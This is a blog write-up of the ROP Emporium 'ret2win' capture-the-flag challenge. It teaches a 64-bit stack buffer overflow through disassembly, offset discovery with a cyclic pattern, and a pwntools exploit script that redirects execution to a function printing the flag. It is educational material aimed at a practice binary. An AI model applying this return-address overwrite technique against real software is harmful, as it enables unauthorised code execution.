<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Ret2win writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Disclaimer I am in no way a binary exploitation guru. In fact, I only very recently started doing binary exploitation. Therefore, if you find any incorrect information or errors, please feel free to point them out and I will do my best to fix them. This post is intended to serve as notes, as well as a basic introduction to newbies." /><meta property="og:description" content="Disclaimer I am in no way a binary exploitation guru. In fact, I only very recently started doing binary exploitation. Therefore, if you find any incorrect information or errors, please feel free to point them out and I will do my best to fix them. This post is intended to serve as notes, as well as a basic introduction to newbies." /><link rel="canonical" href="https://bitisg.github.io/posts/Ret2win/" /><meta property="og:url" content="https://bitisg.github.io/posts/Ret2win/" /><meta property="og:site_name" content="BitisGabonica" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-08-16T15:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Ret2win writeup" /><meta name="twitter:site" content="@BitisGabonica1" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-08-16T15:00:00+02:00","datePublished":"2023-08-16T15:00:00+02:00","description":"Disclaimer I am in no way a binary exploitation guru. In fact, I only very recently started doing binary exploitation. Therefore, if you find any incorrect information or errors, please feel free to point them out and I will do my best to fix them. This post is intended to serve as notes, as well as a basic introduction to newbies.","headline":"Ret2win writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://bitisg.github.io/posts/Ret2win/"},"url":"https://bitisg.github.io/posts/Ret2win/"}</script><title>Ret2win writeup | BitisGabonica</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BitisGabonica"><meta name="application-name" content="BitisGabonica"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/sui.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BitisGabonica</a></div><div class="site-subtitle font-italic">CTF writeups and other stuff</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/BitisG" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/BitisGabonica1" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xBitisGabonica','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Ret2win writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/ctf/ropemporium/ret2win/ret2win.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Ret2win writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1692190800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-08-16 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2455 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><h2 id="disclaimer"><span class="mr-2">Disclaimer</span><a href="#disclaimer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I am in no way a binary exploitation guru. In fact, I only very recently started doing binary exploitation. Therefore, if you find any incorrect information or errors, please feel free to point them out and I will do my best to fix them. This post is intended to serve as notes, as well as a basic introduction to newbies.</p><h2 id="summary"><span class="mr-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is the first challenge from Ropemporium. It focuses on one of the more simple stack based overflow attacks. In this case, we are only interested in overwriting the return address stored on the stack, so that we can jump to a restricted function, which we shouldn’t be able to enter under normal circumstances. However, this attack forms the foundation for more advanced attacks, as we will use the ability to overwrite the return address in later challenges to completely change the behaviour of the target program by injecting a “Rop-Chain” into program memory. This writeup will focus on the 64-bit version of the challenge.</p><h2 id="basics"><span class="mr-2">Basics</span><a href="#basics" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>In this section I will briefly go over some of the basic knowledge needed to successfully complete this challenge. Note that everything here relates to the x86-64 cpu architecture on a linux system.</p><p>For our purpose, the main differences between 32- and 64-bit binaries that we have to be aware of, is that in 32-bit binaries, arguments to functions are passed via the stack, while in 64-bit arguments are passed via registers. The calling convention for 64-bit binaries is RDI, RSI, RDX and so on. This means that the first argument to a function will be stored in the RDI register, the second in the RSI register and so on. When the program runs out of registers however, remaining arguments will be placed on the stack.</p><h3 id="what-is-the-stack"><span class="mr-2">What is the stack?</span><a href="#what-is-the-stack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>A stack is a common data structure. It follows the LIFO principle, meaning that the last item added (pushed) to the stack is the first one to be removed (popped). on x86-64, the stack grows downward towards lower memory addresses. This means that whenever you push a new value onto the stack, this value will have an address in memory that is lower than the values stored before it on the stack. Towards the higher addresses you will find environment variables, as well as commandline arguments. When a function is called, a stack frame is inserted onto the stack. At the top of the stack frame you will find the <code class="language-plaintext highlighter-rouge">RBP</code>, or the base pointer. The base pointer always points at the base, or the start of the current stack frame. Towards the lower addresses of this stack frame you will find local variables to the function.</p><p>I’ve placed a figure below to help illustrate the layout of the stack. The image is taken from <a href="https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64">thegreenplace.net</a>, which I recommend you visit for a more indepth explanation. <img data-src="/assets/img/ctf/ropemporium/ret2win/stack-layout.png" alt="" data-proofer-ignore></p><p>So, what happens when a function writes to a local variable, but doesn’t check the length of the given user input? Depending on the security mitigations in place, you might be able to overwrite data placed higher on the stack than the local variable you are writing to. This includes other local variables, as well as the RBP and return pointer. More on this later.</p><h2 id="tools"><span class="mr-2">Tools</span><a href="#tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I’ll mostly be using the following tools:</p><ul><li><code class="language-plaintext highlighter-rouge">readelf</code>.<li><code class="language-plaintext highlighter-rouge">GDB</code> with the <code class="language-plaintext highlighter-rouge">pwndbg</code> plugin - For dynamic analysis.<li><code class="language-plaintext highlighter-rouge">Ghidra</code> - For static analysis.<li><code class="language-plaintext highlighter-rouge">Pwntools</code> - For exploit automation.<li><code class="language-plaintext highlighter-rouge">ROPgadget</code> - For buidling ropchains / finding gadgets.</ul><h2 id="exploitation"><span class="mr-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>First, let’s get a lay of the land using <code class="language-plaintext highlighter-rouge">readelf</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="gp">bitis@Workstation ~/c/r/ret2win&gt;</span><span class="w"> </span>readelf <span class="nt">-s</span> ret2win
<span class="go">
Symbol table '.symtab' contains 69 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 0000000000400238     0 SECTION LOCAL  DEFAULT    1 .interp
     2: 0000000000400254     0 SECTION LOCAL  DEFAULT    2 .note.ABI-tag
     3: 0000000000400274     0 SECTION LOCAL  DEFAULT    3 .note.gnu.build-id
     4: 0000000000400298     0 SECTION LOCAL  DEFAULT    4 .gnu.hash
     5: 00000000004002c0     0 SECTION LOCAL  DEFAULT    5 .dynsym
     6: 00000000004003b0     0 SECTION LOCAL  DEFAULT    6 .dynstr
     7: 0000000000400416     0 SECTION LOCAL  DEFAULT    7 .gnu.version
     8: 0000000000400430     0 SECTION LOCAL  DEFAULT    8 .gnu.version_r
     9: 0000000000400450     0 SECTION LOCAL  DEFAULT    9 .rela.dyn
    10: 0000000000400498     0 SECTION LOCAL  DEFAULT   10 .rela.plt
    11: 0000000000400528     0 SECTION LOCAL  DEFAULT   11 .init
    12: 0000000000400540     0 SECTION LOCAL  DEFAULT   12 .plt
    13: 00000000004005b0     0 SECTION LOCAL  DEFAULT   13 .text
    14: 00000000004007f4     0 SECTION LOCAL  DEFAULT   14 .fini
    15: 0000000000400800     0 SECTION LOCAL  DEFAULT   15 .rodata
    16: 0000000000400958     0 SECTION LOCAL  DEFAULT   16 .eh_frame_hdr
    17: 00000000004009a8     0 SECTION LOCAL  DEFAULT   17 .eh_frame
    18: 0000000000600e10     0 SECTION LOCAL  DEFAULT   18 .init_array
    19: 0000000000600e18     0 SECTION LOCAL  DEFAULT   19 .fini_array
    20: 0000000000600e20     0 SECTION LOCAL  DEFAULT   20 .dynamic
    21: 0000000000600ff0     0 SECTION LOCAL  DEFAULT   21 .got
    22: 0000000000601000     0 SECTION LOCAL  DEFAULT   22 .got.plt
    23: 0000000000601048     0 SECTION LOCAL  DEFAULT   23 .data
    24: 0000000000601058     0 SECTION LOCAL  DEFAULT   24 .bss
---SNIP---
    34: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS ret2win.c
    35: 00000000004006e8   110 FUNC    LOCAL  DEFAULT   13 pwnme
    36: 0000000000400756    27 FUNC    LOCAL  DEFAULT   13 ret2win
---SNIP---
</span></pre></table></code></div></div><p>In the output, we can see where different data sections are located, as well as the symbol for the functions located in the binary. This can also be done via pwndbg, with the <code class="language-plaintext highlighter-rouge">info functions</code> command.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="gp">pwndbg&gt;</span><span class="w"> </span>inf fu
<span class="go">All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
</span></pre></table></code></div></div><p>Sometimes, the given binary will be stripped. This means that the binary won’t contain any symbols, and we won’t know the names of the different functions in the binary.</p><p>Let’s take a look at the disassembled functions. Let’s start with the <code class="language-plaintext highlighter-rouge">main</code> function:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="gp">pwndbg&gt;</span><span class="w"> </span>disass main
<span class="go">Dump of assembler code for function main:
</span><span class="gp">   0x0000000000400697 &lt;+0&gt;</span>:	push   rbp
<span class="gp">   0x0000000000400698 &lt;+1&gt;</span>:	mov    rbp,rsp
<span class="gp">   0x000000000040069b &lt;+4&gt;</span>:	mov    rax,QWORD PTR <span class="o">[</span>rip+0x2009b6]        <span class="c"># 0x601058 &lt;stdout@@GLIBC_2.2.5&gt;</span>
<span class="gp">   0x00000000004006a2 &lt;+11&gt;</span>:	mov    ecx,0x0
<span class="gp">   0x00000000004006a7 &lt;+16&gt;</span>:	mov    edx,0x2
<span class="gp">   0x00000000004006ac &lt;+21&gt;</span>:	mov    esi,0x0
<span class="gp">   0x00000000004006b1 &lt;+26&gt;</span>:	mov    rdi,rax
<span class="gp">   0x00000000004006b4 &lt;+29&gt;</span>:	call   0x4005a0 &lt;setvbuf@plt&gt;
<span class="gp">   0x00000000004006b9 &lt;+34&gt;</span>:	mov    edi,0x400808
<span class="gp">   0x00000000004006be &lt;+39&gt;</span>:	call   0x400550 &lt;puts@plt&gt;
<span class="gp">   0x00000000004006c3 &lt;+44&gt;</span>:	mov    edi,0x400820
<span class="gp">   0x00000000004006c8 &lt;+49&gt;</span>:	call   0x400550 &lt;puts@plt&gt;
<span class="gp">   0x00000000004006cd &lt;+54&gt;</span>:	mov    eax,0x0
<span class="gp">   0x00000000004006d2 &lt;+59&gt;</span>:	call   0x4006e8 &lt;pwnme&gt;
<span class="gp">   0x00000000004006d7 &lt;+64&gt;</span>:	mov    edi,0x400828
<span class="gp">   0x00000000004006dc &lt;+69&gt;</span>:	call   0x400550 &lt;puts@plt&gt;
<span class="gp">   0x00000000004006e1 &lt;+74&gt;</span>:	mov    eax,0x0
<span class="gp">   0x00000000004006e6 &lt;+79&gt;</span>:	pop    rbp
<span class="gp">   0x00000000004006e7 &lt;+80&gt;</span>:	ret
<span class="go">End of assembler dump.
</span></pre></table></code></div></div><p>This function calls puts twice, which is used to print 2 strings to stdout, before calling a function named pwnme. Let’s have a look at the <code class="language-plaintext highlighter-rouge">pwnme</code> function as well:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="gp">pwndbg&gt;</span><span class="w"> </span>disass pwnme
<span class="go">Dump of assembler code for function pwnme:
</span><span class="gp">   0x00000000004006e8 &lt;+0&gt;</span>:	push   rbp
<span class="gp">   0x00000000004006e9 &lt;+1&gt;</span>:	mov    rbp,rsp
<span class="gp">   0x00000000004006ec &lt;+4&gt;</span>:	sub    rsp,0x20
<span class="gp">   0x00000000004006f0 &lt;+8&gt;</span>:	lea    rax,[rbp-0x20]
<span class="gp">   0x00000000004006f4 &lt;+12&gt;</span>:	mov    edx,0x20
<span class="gp">   0x00000000004006f9 &lt;+17&gt;</span>:	mov    esi,0x0
<span class="gp">   0x00000000004006fe &lt;+22&gt;</span>:	mov    rdi,rax
<span class="gp">   0x0000000000400701 &lt;+25&gt;</span>:	call   0x400580 &lt;memset@plt&gt;
<span class="gp">   0x0000000000400706 &lt;+30&gt;</span>:	mov    edi,0x400838
<span class="gp">   0x000000000040070b &lt;+35&gt;</span>:	call   0x400550 &lt;puts@plt&gt;
<span class="gp">   0x0000000000400710 &lt;+40&gt;</span>:	mov    edi,0x400898
<span class="gp">   0x0000000000400715 &lt;+45&gt;</span>:	call   0x400550 &lt;puts@plt&gt;
<span class="gp">   0x000000000040071a &lt;+50&gt;</span>:	mov    edi,0x4008b8
<span class="gp">   0x000000000040071f &lt;+55&gt;</span>:	call   0x400550 &lt;puts@plt&gt;
<span class="gp">   0x0000000000400724 &lt;+60&gt;</span>:	mov    edi,0x400918
<span class="gp">   0x0000000000400729 &lt;+65&gt;</span>:	mov    eax,0x0
<span class="gp">   0x000000000040072e &lt;+70&gt;</span>:	call   0x400570 &lt;<span class="nb">printf</span>@plt&gt;
<span class="gp">   0x0000000000400733 &lt;+75&gt;</span>:	lea    rax,[rbp-0x20]
<span class="gp">   0x0000000000400737 &lt;+79&gt;</span>:	mov    edx,0x38
<span class="gp">   0x000000000040073c &lt;+84&gt;</span>:	mov    rsi,rax
<span class="gp">   0x000000000040073f &lt;+87&gt;</span>:	mov    edi,0x0
<span class="gp">   0x0000000000400744 &lt;+92&gt;</span>:	call   0x400590 &lt;<span class="nb">read</span>@plt&gt;
<span class="gp">   0x0000000000400749 &lt;+97&gt;</span>:	mov    edi,0x40091b
<span class="gp">   0x000000000040074e &lt;+102&gt;</span>:	call   0x400550 &lt;puts@plt&gt;
<span class="gp">   0x0000000000400753 &lt;+107&gt;</span>:	nop
<span class="gp">   0x0000000000400754 &lt;+108&gt;</span>:	leave
<span class="gp">   0x0000000000400755 &lt;+109&gt;</span>:	ret
<span class="go">End of assembler dump.
</span></pre></table></code></div></div><p>So there’s quite a bit going on in this function, but just like when trying to break any other program, whether that be a web application or something else, we are looking for where the program handles user input. At +92 there’s a call to read. Right before this call the program moves 0x38 into EDX, RAX into RSI and 0x0 into EDI. The content of RAX is the address callculated via the address stored in RBP minus 0x20.</p><p>So what does <code class="language-plaintext highlighter-rouge">read()</code> do? Based on its manpage, it “attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.” The function definition is as follows:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="n">buf</span><span class="p">[.</span><span class="n">count</span><span class="p">],</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
</pre></table></code></div></div><p>Based on the x86-64 calling convention, we know that the first argument passed to <code class="language-plaintext highlighter-rouge">read()</code> is stored in the RDI register, which contains 0, otherwise known as the file descriptor for stdin. The buffer argument is stored RSI, and contains the address calculated by the lea instruction at +75, and the amount of bytes is stored in RDX and is equal to 0x38 (56 bytes).</p><p>So what’s the problem in this program? Well, the problem stems from the address we are writing to. We are writing 0x38 bytes to an address located at RBP-0x20. As discussed earlier, the stack frame layout stores RBP right below the RSP, or the return pointer, and since we are writing 0x38 bytes into an area of memory only 0x20 bytes below RBP, we will be able to overwrite both RBP and RSP. Below is a simple illustration of the stack layout.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">Higher addesses

|--------------------|
|        RSP         |
|--------------------|
|        RBP         | addr of RSP - 0x8
|--------------------|
|     vuln buffer    | addr of RBP - 0x20
|--------------------|

lower addresses

</span></pre></table></code></div></div><p>Since we can control RSP, we can jump to arbitrary places in memory. If the NX (No eXecute) bit on this binary wasn’t set, we might be able to inject shellcode into the process memory, and then jump to it which we could use to spawn a shell and so on. Instead, since the NX bit is set, we will have to make do with functions and so-called gadgets already present in the binary.</p><p>One function of interest is the <code class="language-plaintext highlighter-rouge">ret2win</code> function:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="gp">pwndbg&gt;</span><span class="w"> </span>disass ret2win
<span class="go">Dump of assembler code for function ret2win:
</span><span class="gp">   0x0000000000400756 &lt;+0&gt;</span>:	push   rbp
<span class="gp">   0x0000000000400757 &lt;+1&gt;</span>:	mov    rbp,rsp
<span class="gp">   0x000000000040075a &lt;+4&gt;</span>:	mov    edi,0x400926
<span class="gp">   0x000000000040075f &lt;+9&gt;</span>:	call   0x400550 &lt;puts@plt&gt;
<span class="gp">   0x0000000000400764 &lt;+14&gt;</span>:	mov    edi,0x400943
<span class="gp">   0x0000000000400769 &lt;+19&gt;</span>:	call   0x400560 &lt;system@plt&gt;
<span class="gp">   0x000000000040076e &lt;+24&gt;</span>:	nop
<span class="gp">   0x000000000040076f &lt;+25&gt;</span>:	pop    rbp
<span class="gp">   0x0000000000400770 &lt;+26&gt;</span>:	ret
<span class="go">End of assembler dump.
</span><span class="gp">pwndbg&gt;</span><span class="w"> </span>x/x 0x400943
<span class="go">0x400943:	0x6e69622f
</span><span class="gp">pwndbg&gt;</span><span class="w"> </span>x/s 0x400943
<span class="go">0x400943:	"/bin/cat flag.txt"
</span></pre></table></code></div></div><p>This function calls system and uses it to execute the command <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code>.</p><p>The next step is to figure out how many bytes we need to give the program before we start overwriting the return pointer. One way to do this is to calculate it. We have a buffer of 0x20 bytes before we start overwriting the RBP, which holds 8 bytes, and then we begin to overwrite the rsp. As such, we can write 0x28, or 40 bytes before the program will start to complain and segfault. Another way to figure this out is to write an increasing number of A’s until the program crashes. You can also use the <code class="language-plaintext highlighter-rouge">cyclic pattern</code> feature in pwndbg to find the offset needed.</p><p>Below is an abridged pwndbg interaction detialing how to use the <code class="language-plaintext highlighter-rouge">cyclic pattern</code> feature.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">pwndbg&gt;</span><span class="w"> </span>cyclic 128
<span class="go">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa
</span><span class="gp">pwndbg&gt;</span><span class="w"> </span>ni &lt;<span class="nt">----</span> run the <span class="nb">read</span><span class="o">()</span> syscall
<span class="go">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa &lt;----- Give input to program

*RSP  0x7fffffffdd28 ◂— 0x6161616161616166 ('faaaaaaa') &lt;---- at the ret instruction, pwndbg tells us that the value stored in RSP is 0x6161616161616166

</span><span class="gp">pwndbg&gt;</span><span class="w"> </span>cyclic <span class="nt">-l</span> 0x6161616161616166
<span class="go">Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
</span></pre></table></code></div></div><p>We now know how many bytes to write before overwriting the return address. The next step is to overwrite the return address with the address of the start of the <code class="language-plaintext highlighter-rouge">ret2win</code> function. This address can be found either via pwndbg via the disass command as seen previously, or via the readelf command:</p><pre><code class="language-command">bitis@Workstation ~/c/r/ret2win&gt; readelf -a ret2win | grep ret2win
    34: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS ret2win.c
    36: 0000000000400756    27 FUNC    LOCAL  DEFAULT   13 ret2win
</code></pre><p>While we could write our exploit string into a file and then copy and paste our exploit during program execution, it is much easier and faster to use pwntools. Below is an example of a python script using pwntools that exploits the ret2win binary.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2win'</span><span class="p">)</span>

<span class="s">"""
Since PIE is disabled, we can find the address of the function ret2win() by using readelf:
    36: 0000000000400756    27 FUNC    LOCAL  DEFAULT   13 ret2win

    However we can also do it using pwntools, since symbols are not stripped:
"""</span>

<span class="n">ret2win_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'ret2win'</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="s">"ret2win() address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret2win_addr</span><span class="p">))</span>

<span class="n">ret_gadget</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040053e</span><span class="p">)</span>

<span class="c1"># Spawn process, wait until it asks for input
</span><span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="n">ret_gadget</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret2win_addr</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
